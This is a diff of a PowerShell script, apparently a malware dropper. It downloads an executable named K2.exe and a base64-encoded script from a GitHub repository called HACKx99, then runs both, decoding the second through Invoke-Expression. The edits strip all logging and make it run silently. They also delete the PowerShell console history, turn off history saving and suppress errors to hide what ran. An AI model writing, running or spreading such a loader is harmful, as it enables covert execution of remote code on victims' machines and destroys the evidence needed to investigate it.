@@ -1,5 +1,5 @@
 # RunK2AndClearHistory.ps1
-# Script to download K2.exe and an encrypted file to %TEMP%, run them, and delete PowerShell console history.
+# Script to silently download K2.exe and an encrypted file to %TEMP%, run them, and delete PowerShell console history.
 
 # Define variables
 $tempPath = [System.IO.Path]::GetTempPath()
@@ -7,85 +7,58 @@ $exeName = "K2.exe"
 $exeFullPath = Join-Path $tempPath $exeName
 $encryptedFileName = "encrypted_file.ps1"  # Placeholder name for encrypted file
 $encryptedFullPath = Join-Path $tempPath $encryptedFileName
-$historyPath = "C:\Users\ME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
+$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 $rawUrlK2 = "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe"
 $rawUrlEncrypted = "https://raw.githubusercontent.com/HACKx99/Main1/main/encrypted_file.ps1"  # Replace with actual URL
 
-# Function to log messages
-function Write-Log {
-    param([string]$Message, [string]$Level = "INFO")
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $(if ($Level -eq "ERROR") { "Red" } else { "Green" })
-}
-
 try {
-    # Download K2.exe
-    Write-Log "Downloading $exeName to $tempPath"
+    # Silently download K2.exe
     Invoke-WebRequest -Uri $rawUrlK2 -OutFile $exeFullPath -UseBasicParsing
     
     if (Test-Path $exeFullPath) {
-        $fileSize = (Get-Item $exeFullPath).Length
-        Write-Log "Download successful. File size: $fileSize bytes."
-
-        # Run K2.exe automatically (original method)
-        Write-Log "Executing $exeName..."
+        # Run K2.exe silently
         Start-Process -FilePath $exeFullPath -NoNewWindow -Wait
-        Write-Log "$exeName executed successfully."
     } else {
         throw "Download failed: File not found at $exeFullPath"
     }
 
-    # Download the encrypted file
-    Write-Log "Downloading encrypted file $encryptedFileName to $tempPath"
+    # Silently download the encrypted file
     Invoke-WebRequest -Uri $rawUrlEncrypted -OutFile $encryptedFullPath -UseBasicParsing
     
     if (Test-Path $encryptedFullPath) {
-        $fileSize = (Get-Item $encryptedFullPath).Length
-        Write-Log "Download successful. File size: $fileSize bytes."
-
         # Decrypt and run the encrypted file (assuming base64 encryption as an example)
-        Write-Log "Decrypting and executing $encryptedFileName..."
         $encryptedContent = Get-Content -Path $encryptedFullPath -Raw
         $decryptedBytes = [Convert]::FromBase64String($encryptedContent)  # Adjust decryption based on your method
         $decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
         Invoke-Expression $decryptedScript
-        Write-Log "$encryptedFileName executed successfully."
     } else {
         throw "Download failed: File not found at $encryptedFullPath"
     }
 
-    # Alternative one-liner method for K2.exe (as requested)
-    Write-Log "Executing $exeName using one-liner method..."
-    iwr -Uri "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe" -OutFile "$env:TEMP\K2.exe"; Start-Process -FilePath "$env:TEMP\K2.exe" -Wait; Remove-Item "$env:TEMP\K2.exe" -Force
-    Write-Log "One-liner execution completed."
+    # Alternative one-liner method for K2.exe
+    iwr -Uri "https://raw.githubusercontent.com/HACKx99/Main1/main/K2.exe" -OutFile "$env:TEMP\K2.exe" -UseBasicParsing; Start-Process -FilePath "$env:TEMP\K2.exe" -Wait; Remove-Item "$env:TEMP\K2.exe" -Force
 
-    # Delete the EXE and encrypted file (handled by one-liner for K2, ensure cleanup for encrypted)
+    # Silently delete the EXE and encrypted file
     if (Test-Path $exeFullPath) {
         Remove-Item $exeFullPath -Force
-        Write-Log "Deleted $exeName from $tempPath."
     }
     if (Test-Path $encryptedFullPath) {
         Remove-Item $encryptedFullPath -Force
-        Write-Log "Deleted $encryptedFileName from $tempPath."
     }
 
-    # Delete PowerShell console history forcefully
-    Write-Log "Attempting to delete PowerShell console history from $historyPath"
+    # Silently delete PowerShell console history
     if (Test-Path $historyPath) {
-        $historyFiles = Get-ChildItem -Path $historyPath -File
-        foreach ($file in $historyFiles) {
-            Remove-Item -Path $file.FullName -Force
-            Write-Log "Deleted history file: $($file.Name)"
-        }
-        Write-Log "PowerShell console history cleared successfully."
-    } else {
-        Write-Log "History path $historyPath not found. Skipping deletion."
+        # Clear current session history
+        Clear-History
+        # Remove the history file
+        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+        # Ensure PSReadLine history is cleared by setting history count to 0
+        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     }
 } catch {
-    Write-Log "Error: $($_.Exception.Message)" -Level "ERROR"
+    # Suppress error output
     exit 1
 } finally {
-    # Ensure no console window remains
-    Write-Log "Script completed. Exiting..."
+    # Exit silently
     exit 0
 }
